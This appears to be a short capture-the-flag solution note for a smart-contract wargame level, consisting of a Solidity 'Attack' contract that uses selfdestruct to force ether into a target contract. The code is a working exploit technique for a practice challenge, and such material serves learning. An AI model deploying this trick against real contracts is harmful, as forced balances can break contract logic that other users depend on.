## Description
While doing level 9, I saw how to do this one
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IForce {
    
}

contract Attack {
    IForce force;

    constructor(IForce _force) {
        force = IForce(_force);
    }

    function attack() public payable {
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
}
```